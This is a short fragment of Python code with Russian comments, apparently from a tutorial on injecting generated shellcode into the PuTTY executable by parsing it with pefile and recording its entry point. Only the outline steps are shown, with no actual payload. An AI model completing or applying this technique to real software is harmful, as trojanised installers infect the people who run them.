...
# файл скачан с https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
path = "putty.exe"
f = pefile.PE(path)
# формируем переменную со сгенерированным shell-кодом, который вставим в наш файл 
...
# Здесь сохраняем адрес первой команды, выполняемой файлом
